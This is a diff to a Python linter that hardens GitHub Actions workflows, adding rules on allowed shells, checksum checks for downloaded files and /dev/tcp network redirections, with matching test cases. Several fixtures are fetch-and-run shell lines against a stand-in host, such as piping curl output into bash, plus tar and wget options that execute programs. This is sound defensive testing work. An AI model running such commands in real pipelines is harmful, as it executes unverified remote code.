+        return 1
     adoc = parse_yaml(text, label, rep)
     if adoc is None:
-        return
+        return 1
     runs = adoc.get("runs")
     using = runs.get("using") if runs is not None else None
     kind = using.text().strip() if using is not None and using.kind == "scalar" else ""
+    height = 1
     if kind == "composite":
         steps = runs.get("steps") if runs is not None else None
         if steps is None or steps.kind != "seq" or not steps.value:
             rep.bad(f"{here}: `runs.steps` must be a non-empty list")
-            return
+            return 1
         ctx = run_context(steps, ())
         for i, step in enumerate(steps.value):
             where_step = f"local action `{rel}` step {i + 1}"
@@ -1850,7 +2204,7 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
                 continue
             uses = step.get("uses")
             if uses is not None:
-                check_ref(uses, label, where_step, rep, False, chain + (target,))
+                height = max(height, 1 + check_ref(uses, label, where_step, rep, False, chain + (target,)))
             check_run(step, label, where_step, rep, ctx)
     elif kind == "docker":
         image = runs.get("image") if runs is not None else None
@@ -1858,16 +2212,25 @@ def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report,
             rep.bad(f"{here}: `runs.image` must be a `docker://...@sha256:<64 hex>` image")
     elif kind.startswith("node"):
         main = runs.get("main") if runs is not None else None
-        entry = (target / main.text().strip()).resolve() if main is not None and main.kind == "scalar" else None
+        try:
+            entry = (target / main.text().strip()).resolve() if main is not None and main.kind == "scalar" else None
+        except (OSError, RuntimeError):  # a symlink loop in `main` is a refusal, never an exception
+            entry = None
         if entry is None or (target != entry and target not in entry.parents) or not entry.is_file():
             rep.bad(f"{here}: `runs.main` must name a file inside the action directory")
     else:
         rep.bad(f"{here}: `runs.using` must be `composite`, `docker` or `node*` (got `{kind[:30]}`)")
+    rep.heights[target] = height
+    return height
+
+
+SHELL_ALLOWED = ("bash", "sh")  # Round 7 (N4, F4): the shells whose `-e` behaviour the checksum rule relies on
 
 
 def check_run(step: Node, name: str, where: str, rep: Report, ctx: RunCtx) -> None:
     """Round 6 (vote 6def5ab6): a `run:` names only allow-listed expression roots, and a fetch step runs only
-    the commands of FETCH_ALLOWED."""
+    the commands of FETCH_ALLOWED. Round 7 adds the shell, the network-redirection patterns and the check that a
+    step naming a downloaded file verifies it."""
     run = step.get("run")
     if run is None:
         return
@@ -1875,16 +2238,73 @@ def check_run(step: Node, name: str, where: str, rep: Report, ctx: RunCtx) -> No
     if raw is None:
         rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` must be a scalar or a block (got {run.kind})")
         return
+    shell = step.get("shell")
+    if shell is not None:
+        got = shell.text().strip() if shell.kind == "scalar" else ""
+        if got not in SHELL_ALLOWED:
+            rep.bad(f"{name}: {where}: line {shell.line + 1}: `shell: {(got or shell.kind)[:30]}` is not allowed (Round 7: a "
+                    f"step runs under {' or '.join(SHELL_ALLOWED)}, whose `-e` stops a failed checksum check)")
+    elif ctx.windows and not ctx.default_shell:
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` has no `shell:` on a Windows runner (the default shell there "
+                f"is pwsh; Round 7: name {' or '.join(SHELL_ALLOWED)})")
     for m in EXPR_RE.finditer(raw):
         if not expr_allowed(m.group(1), ctx):
             rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` interpolates `{m.group(0)[:60]}` into the script "
                     "(Round 6: only matrix.<key>, secrets.<NAME> and steps.<id>.outputs.<name> of a safe step of the "
                     "same job may appear in run text; pass any other value through `env:` and quote it in the script)")
-    problem = fetch_problem(raw)
+    if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` opens a network connection through /dev/tcp, /dev/udp or an "
+                "`exec <n<>` descriptor (Round 7, F5: a download that no fetch word names)")
+    facts: Dict[str, object] = {}
+    problem = fetch_problem(raw, ctx, facts)
     if problem:
         rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` is a fetch step that runs {problem} "
                 "(Round 6, 3-agent vote 6def5ab6: a step that downloads may run only "
                 f"{', '.join(FETCH_ALLOWED)}; split it into a fetch step and a use step)")
+    words = [w for w in facts.get("words", [])]  # type: ignore[union-attr]
+    parts = {p for w in words for p in re.split(r"[/=:]", w)}  # a path component or an option value, never a substring
+    hit = next((f for f in sorted(ctx.fetched) if f in parts), None)
+    if hit is not None and not facts.get("verifier"):
+        rep.bad(f"{name}: {where}: line {run.line + 1}: `run:` names `{hit[:40]}`, a file an earlier step of the job "
+                "downloaded, and runs no `sha256sum`, `shasum` or `gh attestation verify` (Round 7, F3: a downloaded file is "
+                "checked in the step that uses it)")
+    for out in facts.get("outputs", []):  # type: ignore[union-attr]
+        base = norm_name(str(out)).rsplit("/", 1)[-1]
+        if base:
+            ctx.fetched.add(base)
+
+
+def defaults_shell(node: Node, name: str, what: str, rep: Report) -> str:
+    """Round 7 (N4): the `defaults.run.shell` of the workflow or a job: "" when unset, else it must be bash or sh."""
+    defaults = node.get("defaults")
+    run = defaults.get("run") if defaults is not None else None
+    shell = run.get("shell") if run is not None else None
+    if shell is None:
+        return ""
+    got = shell.text().strip() if shell.kind == "scalar" else ""
+    if got not in SHELL_ALLOWED:
+        rep.bad(f"{name}: {what}: line {shell.line + 1}: `defaults.run.shell: {(got or shell.kind)[:30]}` is not allowed "
+                f"(Round 7: {' or '.join(SHELL_ALLOWED)} only)")
+    return got
+
+
+def job_windows(job: Node) -> bool:
+    """True when a job runs (or may run, for a matrix) on a Windows label."""
+    ro = job.get("runs-on")
+    text = ro.text().strip().lower() if ro is not None and ro.kind == "scalar" else ""
+    if RUNS_ON_MATRIX_RE.fullmatch(text):
+        return any(v.lower().startswith("windows") for v in matrix_os_values(job))
+    return text.startswith("windows")
+
+
+def check_matrix_exprs(job: Node, name: str, jname: str, rep: Report) -> None:
+    """Round 7 (F2): no matrix value of a job other than release.yml's `release` job (pinned by check_matrix) is an
+    expression, so no event value can widen what the job's own `run:` text may name."""
+    st = job.get("strategy")
+    matrix = st.get("matrix") if st is not None else None
+    if matrix is not None and any("${{" in t for t in node_texts(matrix)):
+        rep.bad(f"{name}: job `{jname}`: line {matrix.line + 1}: a `strategy.matrix` value is an expression (Round 7, F2: "
+                "a matrix value of this job must be a literal; only release.yml's `release` job is pinned by check_matrix)")
 
 
 def check_runs_on(job: Node, name: str, jname: str, rep: Report) -> None:
@@ -1967,11 +2387,13 @@ def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
     if jobs is None or jobs.kind != "map" or not jobs.keys():
         rep.bad(f"{name}: `jobs:` must be a non-empty mapping (got {'nothing' if jobs is None else jobs.kind})")
         return
+    wf_shell = defaults_shell(doc, name, "workflow", rep)
     for jname, job in jobs.value.items():  # type: ignore[union-attr]
         where = f"{name}: job `{jname}`"
         if job.kind != "map":
             rep.bad(f"{where}: line {job.line + 1}: a job must be a mapping (got {job.kind})")
             continue
+        job_shell = defaults_shell(job, name, f"job `{jname}`", rep) or wf_shell
         needs = job.get("needs")
         if needs is not None and not (needs.kind == "scalar" or (
                 needs.kind == "seq" and all(n.kind == "scalar" for n in needs.value))):  # type: ignore[union-attr]
@@ -1979,13 +2401,14 @@ def check_jobs_shape(doc: Node, name: str, rep: Report) -> None:
         check_images(job, name, jname, rep)
         if not (name == "release.yml" and jname == "release"):  # pinned by check_release_job and check_matrix
             check_runs_on(job, name, jname, rep)
+            check_matrix_exprs(job, name, jname, rep)
         steps = job.get("steps")
         if job.get("uses") is not None and steps is None:
             continue  # a reusable-workflow job has no steps; its `uses` is pinned by check_ref
         if steps is None or steps.kind != "seq" or not steps.value:
             rep.bad(f"{where}: `steps` must be a non-empty list (got {'nothing' if steps is None else steps.kind})")
             continue
-        ctx = run_context(steps, matrix_keys(job))
+        ctx = run_context(steps, matrix_keys(job), (doc.get("env"), job.get("env")), job_shell, job_windows(job))
         for i, step in enumerate(steps.value):  # type: ignore[union-attr]
             if step.kind != "map":
                 rep.bad(f"{where} step {i + 1}: line {step.line + 1}: a step must be a mapping (got {step.kind})")
@@ -3366,7 +3789,7 @@ R5_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r5: bash over a curl process substitution is refused": (_r5_run("bash <(curl -fsSL https://x.example/i.sh)"), None, 1, "fetch step"),
     "r5: sh -c over a curl substitution is refused": (_r5_run('sh -c "$(curl -fsSL https://x.example/i.sh)"'), None, 1, "fetch step"),
     "r5: a curl into a variable passes": (_r5_run("x=$(curl -fsSL https://x.example/i)"), None, 0, ""),
-    "r5: a curl piped to tar or sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
+    "r5: a curl piped to sha256sum passes": (_r5_run("curl -fsSL https://x.example/i | sha256sum"), None, 0, ""),
     "r5: a container by tag is refused": (_r5_job(head="    container: rust:latest\n"), None, 1, "`container` image"),
     "r5: a container by digest passes": (_r5_job(head="    container: rust@" + R5_DIGEST + "\n"), None, 0, ""),
     "r5: a container mapping by tag is refused": (_r5_job(head="    container:\n      image: rust:latest\n"), None, 1, "`container` image"),
@@ -3413,11 +3836,27 @@ R7_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r7 N1: a command substitution inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( $(sh f) ))"), None, 1, "fetch step"),
     "r7 N1: a backtick command inside $(( )) of a fetch step is refused": (_r7(R7_FETCH, ": $(( `sh f` ))"), None, 1, "fetch step"),
     "r7 N1: a subshell written as $((cmd) ) of a fetch step is refused": (_r7(R7_FETCH, "$((sh f) )"), None, 1, "fetch step"),
+    "r7 N1: a function definition in a fetch step is scanned": (_r7("f() { sh f; }", R7_FETCH), None, 1, "fetch step"),
+    "r7 N1: a function definition holding a plain command passes": (_r7(R7_FETCH, "f() { echo hi; }"), None, 0, ""),
+    "r7 F3: a curl piped to tar with no checksum check is refused (it passed in round 6)": (
+        _r5_run("curl -fsSL https://x.example/i | tar xz\n          curl -fsSL https://x.example/i | sha256sum"), None, 1, "before a checksum check"),
     "r7 N1: plain arithmetic in a fetch step passes the scan": (_r7(R7_FETCH, "echo $(( 1 + 2 ))"), None, 0, ""),
     # --- N2: a braced GITHUB_ENV / GITHUB_PATH write is a write.
     "r7 N2: a braced GITHUB_ENV write in a fetch step is refused": (_r7(R7_FETCH, 'echo "X=1" >> "${GITHUB_ENV}"'), None, 1, "fetch step"),
     "r7 N2: a braced GITHUB_PATH write in a fetch step is refused": (_r7(R7_FETCH, 'echo "$PWD" >> ${GITHUB_PATH}'), None, 1, "fetch step"),
     # --- N3: wget options are an allow-list.
+    "r7 N6: a local action that is a symlink loop is refused, not raised": (
+        _r7_steps("      - uses: ./loop\n"), {"loop": "\0symlink:loop"}, 1, "local action"),
+    "r7 N2: a fetched file copied over GITHUB_ENV after the checksum check is refused": (
+        _r7(R7_FETCH, R7_VERIFY, 'cp f "$GITHUB_ENV"'), None, 1, "GITHUB_ENV"),
+    "r7 F3: tar with a short option that runs a program is refused after the checksum check": (
+        _r7(R7_FETCH, R7_VERIFY, "tar -I sh -xf f"), None, 1, "tar option"),
+    "r7 F3: tar with a long option that runs a program is refused after the checksum check": (
+        _r7(R7_FETCH, R7_VERIFY, "tar -xf f --to-command=sh"), None, 1, "tar option"),
+    "r7 F5: an exec descriptor opened on a split /dev/tcp path is refused": (
+        _r7('exec 3<>"/dev/t""cp/x.example/80"'), None, 1, "network connection"),
+    "r7 F5: python -c without a network word is a fetch step and runs outside the allow-list": (
+        _r7("python3 -c 'import os; os.system(\"true\")'"), None, 1, "fetch step"),
     "r7 N3: wget --use-askpass in a fetch step is refused": (_r7("wget --use-askpass=./x -O f https://x.example/f"), None, 1, "wget"),
     "r7 N3: wget -e use_askpass in a fetch step is refused": (_r7("wget -e use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
     "r7 N3: wget --execute in a fetch step is refused": (_r7("wget --execute=use_askpass=./x -O f https://x.example/f"), None, 1, "wget"),
@@ -3467,6 +3906,8 @@ R7_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
     "r7 F3: a download written to the system bin directory is refused": (_r7("curl -fsSL -o /usr/local/bin/tool https://x.example/f"), None, 1, "bin directory"),
     "r7 F3: a later step that runs a downloaded file with no checksum is refused": (
         _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: chmod +x f && ./f\n"), None, 1, "downloaded"),
+    "r7 F3: a later step with a word that merely starts with the file name passes": (
+        _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: echo foo\n"), None, 0, ""),
     "r7 F3: a later step that checks the downloaded file passes": (
         _r7_steps("      - run: " + R7_FETCH + "\n", "      - run: |\n          " + R7_VERIFY + "\n          tar xzf f\n"), None, 0, ""),
     # --- F5: a download that no fetch word names.
@@ -3484,6 +3925,29 @@ R7_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
         _r5_job(steps="    steps:\n      - uses: ./n2\n      - uses: ./n0\n"), {**{"n%d/action.yml" % k: _r5_comp(("    - uses: ./n%d\n" % (k + 1)) if k < 9 else "    - run: echo ok\n      shell: bash\n") for k in range(10)}}, 1, "nests more than"),
     "r7 N6: the same shallow action used twice passes": (
         _r5_job(steps="    steps:\n" + R5_LOCAL + R5_LOCAL), _r5_act(_r5_comp("    - run: echo ok\n      shell: bash\n")), 0, ""),
+    "r7 F3: a verify behind false && does not count": (_r7(R7_FETCH, "false && " + R7_VERIFY, "tar xzf f"), None, 1, "before a checksum check"),
+    "r7 F3: a negated verify does not count": (_r7(R7_FETCH, "! " + R7_VERIFY, "tar xzf f"), None, 1, "before a checksum check"),
+    "r7 F3: a verify inside a subshell does not count": (_r7(R7_FETCH, "(" + R7_VERIFY + ")", "tar xzf f"), None, 1, "before a checksum check"),
+    "r7 F3: verify && tar passes": (_r7(R7_FETCH, R7_VERIFY + " && tar xzf f"), None, 0, ""),
+    "r7 F3: tar into the bin directory after a verify passes": (_r7(R7_FETCH, R7_VERIFY, "tar xzf f -C /usr/local/bin nfpm"), None, 0, ""),
+    "r7 F3: a URL that names a bin directory passes": (_r7("curl -fsSL -o f https://x.example/usr/bin/tool", R7_VERIFY), None, 0, ""),
+    "r7 F3: a redirect to a computed path in a fetch step is refused": (_r7(R7_FETCH, "echo x > $HOME/f"), None, 1, "computed path"),
+    "r7 F1: a relay through a script the scanner cannot read taints a later writer": (
+        _r7_steps("      - run: echo \"$T\" >> x; echo )\n" + R7_DIRTY_ENV,
+                  "      - id: x\n        run: echo \"y=1\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n"), None, 1, "interpolates"),
+    "r7 N5: a job env of allowed expressions keeps clean outputs": (
+        _r7_steps("      - id: x\n        run: echo \"y=$S\" >> \"$GITHUB_OUTPUT\"\n", "      - run: echo ${{ steps.x.outputs.y }}\n",
+                  head="    env:\n      S: ${{ secrets.TOKEN }}\n"), None, 0, ""),
+    "r7 F4: a Windows matrix leg with no shell is refused": (
+        _r7_steps(R5_OK_RUN, head="    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [windows-latest]\n"), None, 1, "no `shell:`"),
+    "r7 F4: a Windows job whose default shell is bash passes": (
+        _r7_steps(R5_OK_RUN, head="    runs-on: windows-latest\n    defaults:\n      run:\n        shell: bash\n"), None, 0, ""),
+    "r7 F5: docker run of a locally built image passes": (
+        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: true\n          tags: ai-memory-ci:verify\n",
+                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 0, ""),
+    "r7 F5: docker run of an image the build step did not load is refused": (
+        _r7_steps("      - uses: " + IMAGE_BUILD_USES + "\n        with:\n          load: false\n          tags: ai-memory-ci:verify\n",
+                  "      - run: docker run --rm ai-memory-ci:verify ls\n"), None, 1, "fetch step"),
 }
 
 
@@ -3494,7 +3958,10 @@ def r5_errors(doc_text: str, files: Optional[Dict[str, str]], tree: Path) -> Lis
     tree.mkdir(parents=True)
     for rel, text in (files or {}).items():
         (tree / rel).parent.mkdir(parents=True, exist_ok=True)
-        (tree / rel).write_text(text, encoding="utf-8")
+        if text.startswith("\0symlink:"):  # a symlink to the named path, resolved against the tree
+            (tree / rel).symlink_to(text[len("\0symlink:"):])
+        else:
+            (tree / rel).write_text(text, encoding="utf-8")
     rep = Report()
     rep.root = tree if files is not None else None
     doc = parse_yaml(doc_text, "w.yml", rep)
@@ -3817,8 +4284,9 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
     ("steps path need not be outputs", 'return len(parts) == 4 and parts[2] == "outputs" and', 'return len(parts) == 4 and'),
     ("steps id need not be safe", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] not in ctx.tainted'),
     ("steps id may be tainted", 'and parts[1] in ctx.safe and parts[1] not in ctx.tainted', 'and parts[1] in ctx.safe'),
-    ("unpinned use output allowed", 'SHA_USES_RE.fullmatch(uses.text().strip())', 'True'),
-    ("tainting env refs ignored", 'TAINT_ENV_RE.search(body) or not all(', 'not all('),
+    ("unpinned use output allowed", 'uses.kind == "scalar" and SHA_USES_RE.fullmatch(uses.text().strip()):\n            writer = True',
+     'uses.kind == "scalar" and True:\n            writer = True'),
+    ("tainting env refs ignored", 'dirty = bool(TAINT_ENV_RE.search(body)) or not all(', 'dirty = False or not all('),
     ("tainting expressions ignored", 'or not all(expr_allowed(e, ctx) for e in step_exprs(step))', 'or False'),
     ("taint does not spread", 'tainted.add(sid)\n                changed = True', 'tainted.add(sid)\n                changed = False'),
     ("here-document in a fetch step allowed", 'if scan.heredocs:', 'if False:'),
@@ -3830,7 +4298,7 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
     ("tar long option not checked", 'ok = TAR_LONG_RE.fullmatch(arg) is not None', 'ok = True'),
     ("tar first argument not checked", 'ok = arg.startswith("-") or n == 0', 'ok = True'),
     ("git clone is not a fetch", 'clone = any(w == "git" and', 'clone = False and any(w == "git" and'),
-    ("unreadable fetch text allowed", 'return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) else ""', 'return ""'),
+    ("unreadable fetch text allowed", 'return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) or FETCH_PHRASE_RE.search(text) else ""', 'return ""'),
     ("runs-on label list not applied", 'ok = text in HOSTED_RUNNERS', 'ok = bool(text)'),
     ("runs-on matrix may be empty", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = all(v in HOSTED_RUNNERS for v in values)'),
     ("runs-on matrix values not checked", 'ok = bool(values) and all(v in HOSTED_RUNNERS for v in values)', 'ok = bool(values)'),
@@ -3844,6 +4312,48 @@ CONDITION_MUTANTS: Tuple[Tuple[str, str, str], ...] = (
      r'DOCKER_USES_RE = re.compile(r"docker://[a-z0-9][a-z0-9_./:-]*@sha256:[0-9a-f]+")'),
     ("container never inspected", 'if container is not None:', 'if False:'),
     ("dot segment not refused",'if any(seg in ("", ".", "..") for seg in segs):', 'if any(seg in ("",) for seg in segs):'),
+    # --- Round 7
+    ("job and workflow env never taint", 'env_dirty or dirty', 'dirty'),
+    ("workflow env not read", '(doc.get("env"), job.get("env"))', '(job.get("env"),)'),
+    ("job env not read", '(doc.get("env"), job.get("env"))', '(doc.get("env"),)'),
+    ("GITHUB_ENV relay ignored", 'dirty or relay or', 'dirty or False or'),
+    ("file relay ignored", 'any(n in body for n in names)', 'False'),
+    ("unreadable relay ignored", '"\\0unreadable" in names', 'False'),
+    ("with values not tainting", 'for key in ("env", "with"):', 'for key in ("env",):'),
+    ("legacy set-output not a writer", 'writer = "GITHUB_OUTPUT" in body or "set-output" in body', 'writer = "GITHUB_OUTPUT" in body'),
+    ("pwsh shell allowed", 'SHELL_ALLOWED = ("bash", "sh")', 'SHELL_ALLOWED = ("bash", "sh", "pwsh", "python")'),
+    ("windows run needs no shell", 'elif ctx.windows and not ctx.default_shell:', 'elif False:'),
+    ("windows default shell ignored", 'elif ctx.windows and not ctx.default_shell:', 'elif ctx.windows:'),
+    ("windows runner label not read", 'return text.startswith("windows")', 'return False'),
+    ("windows matrix leg not read", 'return any(v.lower().startswith("windows") for v in matrix_os_values(job))', 'return False'),
+    ("expression matrix value allowed", 'if matrix is not None and any("${{" in t for t in node_texts(matrix)):', 'if False:'),
+    ("dev tcp redirect allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if EXEC_FD_RE.search(raw):'),
+    ("exec descriptor allowed", 'if DEV_NET_RE.search(raw) or EXEC_FD_RE.search(raw):', 'if DEV_NET_RE.search(raw):'),
+    ("downloaded file never looked for", 'hit = next((f for f in sorted(ctx.fetched) if f in parts), None)', 'hit = None'),
+    ("downloaded file matched by substring", 'parts = {p for w in words for p in re.split(r"[/=:]", w)}', 'parts = {p for w in words for p in [w] + [w[:k] for k in range(len(w))]}'),
+    ("later step needs no checksum", 'if hit is not None and not facts.get("verifier"):', 'if hit is not None and False:'),
+    ("downloads not remembered", 'ctx.fetched.add(base)', 'pass'),
+    ("computed redirect allowed", 'if "$" in target or "`" in target:', 'if False:'),
+    ("bin directory allowed", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if False:'),
+    ("tar -C directory refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if not URL_RE.match(w) and BIN_DIR_RE.search(w):'),
+    ("url with a bin path refused", 'if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):', 'if w not in tar_dirs and BIN_DIR_RE.search(w):'),
+    ("consumer needs no checksum", 'if word in FETCH_CONSUMERS and not (verified or', 'if word in FETCH_CONSUMERS and False and not (verified or'),
+    ("verify and consumer chain refused", '(verified or (and_verify == k - 1 and info["prev"] == "&&"))', '(verified)'),
+    ("verify may sit in a subshell", 'if is_verify(word, args) and info["top"] and', 'if is_verify(word, args) and'),
+    ("negated verify counts", 'and not start["neg"] and', 'and'),
+    ("verify may follow &&", 'start["prev"] in ("\\n", ";"):', 'start["prev"] in ("\\n", ";", "&&", "||"):'),
+    ("pipeline start not followed", 'while first > 0 and scan.info[first]["prev"] == "|":', 'while False:'),
+    ("output over a command name allowed", 'if base in FETCH_ALLOWED:\n            return f"a download written over', 'if False:\n            return f"a download written over'),
+    ("docker run of a tag allowed", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if False:'),
+    ("docker run of any local tag refused", 'if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):', 'if not IMAGE_DIGEST_RE.fullmatch(image):'),
+    ("gh release download allowed", 'if base == "gh" and any(tuple(rest[i:i + 2]) in FETCH_GH for i in range(len(rest))):', 'if False:'),
+    ("python -c allowed", 'if "-c" in tail or any(', 'if any('),
+    ("function definition refused", 're.fullmatch(r"\\w+", name[0]) and re.match(', 're.fullmatch(r"\\w+", name[0]) and False and re.match('),
+    ("walked action keeps no height", 'if len(chain) + height > MAX_LOCAL_DEPTH:', 'if False:'),
+    ("walked action height forgotten", 'height = rep.heights.get(target, 1)', 'height = 1'),
+    ("cycle not refused", 'if target in chain:', 'if False:'),
+    ("depth limit raised", 'if len(chain) >= MAX_LOCAL_DEPTH:', 'if len(chain) >= 80:'),
+    ("arithmetic body not walked", 'return self.walk_arithmetic(i)', 'self.i = self.s.index("))", i) + 2\n            return "$(())"'),
 )
 
 
